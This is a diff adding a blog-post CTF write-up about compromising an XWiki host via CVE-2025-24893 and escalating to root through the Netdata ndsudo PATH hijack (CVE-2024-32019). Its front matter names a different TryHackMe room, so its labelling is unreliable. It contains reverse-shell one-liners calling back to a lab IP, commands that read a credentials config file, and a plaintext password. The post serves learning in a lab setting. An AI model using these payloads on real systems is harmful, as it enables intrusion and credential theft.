@@ -1,0 +1,187 @@
+---
+layout: post
+title: Editor
+date:   2025-11-10 11:05
+description: TryHackMe Mr. Robot CTF Write-Up
+tags: tryhackme wordpress 
+comments: false
+---
+-TRYHACKME CTF WRITEUP-
+[Link To CTF](https://tryhackme.com/room/mrrobot)
+<br>
+<br>
+<br>
+## We start with an Nmap Scan
+## We can see:
+
+
+## After navigating to the website on port 8080
+## We can see a webpage for coders built with python (xwiki)
+<br>
+
+---------------------------failed
+## /robots.txt shows 50 disallowed pages:
+
+Some interesting pages are:
+Disallow: /xwiki/bin/admin/
+Disallow: /xwiki/bin/login/
+Disallow: /xwiki/bin/upload/
+Disallow: /xwiki/bin/edit/
+Disallow: /xwiki/bin/register/
+
+
+follow /admin page
+
+found possible user to brute force:
+Last modified by Neal Bagwell on 2025/06/16 09:39 
+start hydra for ssh login for neal 
+failed
+
+found possible sql link from login page -> forgot username -> send username to email:
+http://10.10.11.80:8080/xwiki/bin/login/XWiki/XWikiLogin?loginLink=1
+started sqlmap to look for poss injections
+failed
+
+found exploit for xwki on exploit -d
+CVE-2025-24893 – Unauthenticated Remote Code ...
+failed all 3
+
+
+http://10.10.11.80:8080/xwiki/bin/export
+need admin rights for this page
+---------------------------failed
+
+## Doing a search on XWiki we can see it is in fact vulnerable:
+{% highlight bash %}
+XWiki is vulnerable to a remote code execution (RCE) attack through its user registration feature. This issue allows an attacker to execute arbitrary code by crafting malicious payloads in the "first name" or "last name" fields during user registration. This impacts all installations that have user registration enabled for guests.
+
+To reproduce, register with any username and password and the following payload as "first name": ]]{{/html}}{{async}}{{groovy}}services.logging.getLogger("attacker").error("Attack succeeded){{/groovy}}{{/async}}. In the following page that confirms the success of the registration, the full first name should be displayed, linking to the created user. If the formatting is broken and a log message with content "ERROR attacker - Attack succeeded!" is logged, the attack succeeded.
+{% endhighlight bash %}
+<br>
+
+## After searching xwiki exploits, We find two that work for our purposes:
+[github.com/CMassa/CVE-2025-24893](https://github.com/CMassa/CVE-2025-24893/blob/main/CVE-2025-24893.py)
+## AND
+[github.com/Infinit3i/CVE-2025-24893](https://github.com/Infinit3i/CVE-2025-24893/blob/main/CVE-2025-24893-PoC.py)
+<br>
+
+## We now get RCE on the system:
+{% highlight bash %}
+-python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command pwd
+
+-python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'ls ../../../../../../'    
+
+-python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'ls ../../../../../../home/'  
+
+{% endhighlight bash %}
+<br>
+---------------------------failed v
+found user oliver in home directory
+
+(brute force ssh failed for oliver user)
+
+
+used RCE to download reverse shell onto machine
+(needed to tweark - reverse php shell didn't work - got shell on my own system instead) later worked 
+
+
+RCE
+https://github.com/CMassa/CVE-2025-24893/blob/main/CVE-2025-24893.py
+and
+https://github.com/Infinit3i/CVE-2025-24893/blob/main/CVE-2025-24893-PoC.py
+
+
+
+python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'ls ../../../../../../'
+
+Testing:
+1. python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command '<?php shell_exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.186/4444 0>&1'"); ?>' 
+
+2.  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.186 4444 >/tmp/f
+
+FAILED
+---------------------------failed ^
+
+## We can search around to find credentials:
+{% highlight bash %}
+python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'ls -al /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml'      
+python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'cat /etc/xwiki/hibernate.cfg.xml'                                                                                     
+{% endhighlight bash %}
+<br>
+
+<span class="hoverblur">username:  oliver                                                                                                                                                                     
+password:  theEd1t0rTeam99</span>
+<br>
+
+## With these credentials we can now gain SSH access !
+<br>
+<br>
+<br>
+
+# Priv esc 
+<br>
+
+## Running 'id' showed netdata
+## Googling for exploits i found CVE-2024-32019
+
+
+---------------
+{% highlight bash %}
+Summary
+
+The ndsudo tool shipped with affected versions of the Netdata Agent allows an attacker to run arbitrary programs with root permissions.
+Details
+
+The ndsudo tool is packaged as a root-owned executable with the SUID bit set.
+It only runs a restricted set of external commands, but its search paths are supplied by the PATH environment variable. This allows an attacker to control where ndsudo looks for these commands, which may be a path the attacker has write access to.
+PoC
+
+As a user that has permission to run ndsudo:
+Place an executable with a name that is on ndsudo’s list of commands (e.g. nvme) in a writable path
+Set the PATH environment variable so that it contains this path
+Run ndsudo with a command that will run the aforementioned executable
+
+Impact:  Local privilege escalation.
+{% endhighlight bash %}
+--------------
+<br>
+
+## Essentially, netdata includes 'ndsudo', which has the suid bit set
+## This will run commands such as 'nvme'
+## This is vulnerability to a PATH exploit, if you call the command it is running first
+<br>
+
+## Running string on the file:
+## We can see that nvme is listed as a command that can be called:
+{% highlight bash %}
+strings /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+{% endhighlight bash %}
+<br>
+
+## We can now add a fake 'nvme' file into /tmp:
+
+
+## We will want to compile C code in order to spawn shell:
+
+
+## We can then upload to the target:
+
+
+## Then modify permissions and PATH:
+{% highlight bash %}
+chmod +x /tmp/nvme
+export PATH=/tmp:$PATH
+{% endhighlight bash %}
+
+
+## When we run:
+{% highlight bash %}
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+{% endhighlight bash %}
+
+
+## We now get ROOT!
+<br>
+<br>
+<br>
+## This machine demonstrated how to gain initial access through CVE-2025-24893 in XWiki 15.10.8 and escalate privileges using CVE-2024-32019 in Netdata's ndsudo plugin
